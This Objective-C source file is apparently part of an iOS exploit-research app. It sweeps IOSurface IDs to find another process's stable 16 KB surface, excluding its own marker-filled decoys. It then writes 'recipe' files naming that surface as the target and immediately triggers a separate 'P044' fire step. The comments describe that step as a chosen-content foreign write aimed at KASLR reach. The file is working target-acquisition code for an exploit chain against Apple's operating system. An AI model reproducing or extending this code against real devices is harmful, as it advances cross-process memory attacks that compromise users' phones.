//
//  P186AutoAimFire.m — the AUTO-AIM composite: census -> target file ->
//  the P044 fire, all in ONE tap.
//
//  WHY (the 2026-11-27 17 fire receipt): the sid drifts within minutes
//    (the 19:41 census's sid 8 was dead by fire time; the framebuffer
//    class had moved to 253/254/255), and the file round-trip is the
//    window. P186 closes it: the census and the fire happen in the same
//    tap, seconds apart.
//
//  THE TARGET LAW (settled by this fire + the v52 receipt):
//    - the SIZE GATE: the consumer validates size-vs-expected -- ONLY
//      16,384-byte surfaces pass (the v52 receipt: the 383 foreign hits
//      passed BECAUSE they are exactly the model's output size). The
//      framebuffer class (0xbd0000/0xf04000) is NOT aimable.
//    - the OWN-STAGING law: our prior taps' lingering surfaces pollute
//      the band -- P186 stages its census surfaces with a UNIQUE MARKER
//      and excludes any hit carrying it; P044's own v57 re-validation
//      remains the final judge.
//    - the STILLNESS law: the target must be stable across a 1.2s
//      re-diff (the v56 movers law).
//
//  THE FLOW (one tap):
//    P1  stage 16 marker-filled census surfaces (the own-staging immunity)
//    P2  the 16KB-only census: IOSurfaceLookup 1..4096; hits must be
//        16384B, marker-free, and stable across the re-diff
//    P3  AUTO-ARM: write the FOUR recipe files (p044_target.txt = the
//        fresh sid; p044_model.txt = XVRC27_127in_copyout;
//        p044_req_in.txt = 127; p044_fill.txt = the zebra list)
//    P4  invoke the P044 tap -- the full fire (its own v57/v64 gates
//        re-validate the aim honestly; its log file lands as usual)
//    P5  the composite verdict rows
//
//  NEVER sets hasKread. The write receipt class = note 164 (the
//  chosen-content foreign write). Log p186_auto_aim_log.txt.
//

#import "P186AutoAimFire.h"
#import "P044AksKaslrReach.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <IOSurface/IOSurfaceRef.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <string.h>
#import <unistd.h>

#define P186_BUILD @"p186-auto-aim-fire-v1"
#define P186_SWEEP_MAX 4096

typedef void *(*p186_create_t)(CFDictionaryRef);
typedef uint32_t (*p186_getid_t)(IOSurfaceRef);
typedef size_t (*p186_allocsz_t)(IOSurfaceRef);
typedef IOSurfaceRef (*p186_lookup_t)(uint32_t);
typedef int (*p186_lock_t)(IOSurfaceRef, int, void *);
typedef void *(*p186_base_t)(IOSurfaceRef);

@implementation P186AutoAimFire

+ (NSString *)tap {
    NSMutableString *log = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    int fd = open([[docs stringByAppendingPathComponent:
                    @"p186_auto_aim_log.txt"] UTF8String],
                  O_CREAT | O_WRONLY | O_TRUNC, 0644);
    void (^L)(NSString *) = ^(NSString *s) {
        NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
        [log appendString:out];
        if (fd >= 0) { const char *p = out.UTF8String; if (p) write(fd, p, strlen(p)); }
    };

    L([NSString stringWithFormat:@"=== p186 session %@ BUILD %@ ===",
       LabLocalMilitaryNow() ?: @"?", P186_BUILD]);
    L(@"THE AUTO-AIM COMPOSITE: census -> target file -> the P044 fire,");
    L(@"one tap, no drift window. The SIZE GATE law: only 16,384-byte");
    L(@"surfaces are aimable (the framebuffer class is NOT). The marker");
    L(@"law excludes our own staging. P044's v57/v64 gates re-validate.");
    L(@"NEVER sets hasKread.");
    L([LabDeviceProfile identBlock] ?: @"ident=?");

    void *isf = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    p186_create_t sfCreate = (p186_create_t)dlsym(isf, "IOSurfaceCreate");
    p186_getid_t  sfGetID  = (p186_getid_t)dlsym(isf, "IOSurfaceGetID");
    p186_allocsz_t sfAlloc = (p186_allocsz_t)dlsym(isf, "IOSurfaceGetAllocSize");
    p186_lookup_t sfLookup = (p186_lookup_t)dlsym(isf, "IOSurfaceLookup");
    p186_lock_t   sfLock   = (p186_lock_t)dlsym(isf, "IOSurfaceLock");
    p186_base_t   sfBase   = (p186_base_t)dlsym(isf, "IOSurfaceGetBaseAddress");
    if (!sfCreate || !sfGetID || !sfLookup || !sfAlloc || !sfBase) {
        L(@"[-] IOSurface symbols unresolved -- tap void");
        if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
        return log;
    }

    /* ── P1: the marker-staged census surfaces (16KB class, marker-filled) ── */
    L(@"");
    L(@"=== P1: the marker staging (own-staging immunity) ===");
    const uint64_t mark = 0x503138364D414B31ULL;   /* "P186MAK1" */
    IOSurfaceRef ours[16];
    int nOurs = 0;
    NSDictionary *props = @{
        @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @4,
        @"IOSurfacePixelFormat": @0x42475241,
    };
    for (int i = 0; i < 16; i++) {
        IOSurfaceRef s = sfCreate((__bridge CFDictionaryRef)props);
        if (!s) continue;
        if (sfLock && sfBase && sfLock(s, 1, NULL) == 0) {
            uint64_t *b = (uint64_t *)sfBase(s);
            for (int q = 0; q < 512; q++) b[q] = mark ^ (uint64_t)q;
            sfLock(s, 0, NULL);
        }
        ours[nOurs++] = s;
    }
    L([NSString stringWithFormat:@"[P1] %d marker surfaces staged (mark 0x%016llx)",
       nOurs, (unsigned long long)mark]);

    /* ── P2: the 16KB-only census + the stillness re-diff ── */
    L(@"");
    L(@"=== P2: the 16KB census (size gate + marker exclusion + stillness) ===");
    struct cand { uint32_t sid; uint8_t snap[64]; int stable; };
    struct cand cands[16];
    int nCands = 0;
    for (uint32_t sid = 1; sid < P186_SWEEP_MAX && nCands < 16; sid++) {
        IOSurfaceRef f = sfLookup(sid);
        if (!f) continue;
        int mine = 0;
        for (int k = 0; k < nOurs; k++) {
            if (ours[k] && sfGetID(ours[k]) == sid) { mine = 1; break; }
        }
        if (mine) { CFRelease(f); continue; }
        size_t sz = sfAlloc(f);
        if (sz != 16384) { CFRelease(f); continue; }      /* THE SIZE GATE */
        /* the marker exclusion */
        int marked = 0;
        uint8_t snap[64];
        memset(snap, 0, sizeof snap);
        if (sfLock && sfBase && sfLock(f, 1, NULL) == 0) {
            uint8_t *b = (uint8_t *)sfBase(f);
            memcpy(snap, b, sizeof snap);
            uint64_t *q64 = (uint64_t *)b;
            for (int q = 0; q + 1 < 512; q++) {
                if ((q64[q] ^ q) == mark) { marked = 1; break; }
            }
            sfLock(f, 0, NULL);
        }
        CFRelease(f);
        if (marked) continue;
        cands[nCands].sid = sid;
        memcpy(cands[nCands].snap, snap, sizeof snap);
        cands[nCands].stable = 0;
        nCands++;
        L([NSString stringWithFormat:@"[P2] candidate sid=%u (16KB, marker-free)",
           sid]);
    }
    /* the stillness re-diff: 1.2s apart (the v56 movers law) */
    usleep(1200000);
    for (int c = 0; c < nCands; c++) {
        IOSurfaceRef f = sfLookup(cands[c].sid);
        if (!f) continue;
        uint8_t snap2[64];
        memset(snap2, 0, sizeof snap2);
        if (sfLock && sfBase && sfLock(f, 1, NULL) == 0) {
            memcpy(snap2, sfBase(f), sizeof snap2);
            sfLock(f, 0, NULL);
        }
        CFRelease(f);
        if (memcmp(snap2, cands[c].snap, sizeof snap2) == 0)
            cands[c].stable = 1;
    }
    int stableN = 0;
    for (int c = 0; c < nCands; c++) {
        L([NSString stringWithFormat:@"[P2] sid=%u stable=%d",
           cands[c].sid, cands[c].stable]);
        if (cands[c].stable) stableN++;
    }
    L([NSString stringWithFormat:
       @"[P2] census done: %d candidates, %d stable", nCands, stableN]);

    for (int k = 0; k < nOurs; k++) if (ours[k]) CFRelease(ours[k]);

    /* ── P3: AUTO-ARM -- the four recipe files ── */
    L(@"");
    L(@"=== P3: AUTO-ARM ===");
    uint32_t target = 0;
    for (int c = 0; c < nCands; c++) {
        if (cands[c].stable) { target = cands[c].sid; break; }
    }
    if (!target) {
        L(@"[P3] NO stable 16KB marker-free target this tap -- the lane");
        L(@"    HOLDS honestly (the aimable class is transient ANE staging;");
        L(@"    re-tap when other ANE activity is live on the device).");
        L(@"[=] NO FIRE THIS TAP. NEVER hasKread.");
        if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
        return log;
    }
    {
        NSString *t = [docs stringByAppendingPathComponent:@"p044_target.txt"];
        NSString *m = [docs stringByAppendingPathComponent:@"p044_model.txt"];
        NSString *r = [docs stringByAppendingPathComponent:@"p044_req_in.txt"];
        NSString *f = [docs stringByAppendingPathComponent:@"p044_fill.txt"];
        [[NSString stringWithFormat:@"%u", target]
            writeToFile:t atomically:YES encoding:NSUTF8StringEncoding error:NULL];
        [@"XVRC27_127in_copyout"
            writeToFile:m atomically:YES encoding:NSUTF8StringEncoding error:NULL];
        [@"127"
            writeToFile:r atomically:YES encoding:NSUTF8StringEncoding error:NULL];
        NSMutableString *zebra = [NSMutableString string];
        for (int i = 0; i < 127; i++)
            [zebra appendFormat:@"%@%@", (i ? @"," : @""),
             (i & 1) ? @"0000" : @"ffff"];
        [zebra writeToFile:f atomically:YES encoding:NSUTF8StringEncoding error:NULL];
        L([NSString stringWithFormat:
           @"[P3] TARGET ARMED: p044_target.txt=%u (stable, 16KB, marker-free)",
           target]);
        L(@"[P3] model=XVRC27_127in_copyout req_in=127 fill=127-tile zebra");
        L(@"[P3] invoking the P044 fire NOW (its v57/v64 gates re-validate)...");
    }

    /* ── P4: the fire (the full P044 tap) ── */
    NSString *p044log = [P044AksKaslrReach tap];
    L(@"");
    L(@"=== P4: the P044 fire log (verbatim) ===");
    L(p044log ?: @"(p044 tap returned nil)");

    /* ── P5: the composite verdict ── */
    L(@"");
    L(@"=== P5: COMPOSITE VERDICT ===");
    L([NSString stringWithFormat:
       @"[p186] target=%u stable=%d -- the P044 verdict rows above decide "
       @"(v64 RESOLVES + the foreign-lane diff + pred status). "
       @"A foreign-lane diff>0 = the note-164 class write receipt. "
       @"NEVER hasKread.",
       target, 1]);

    if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
    return log;
}

@end
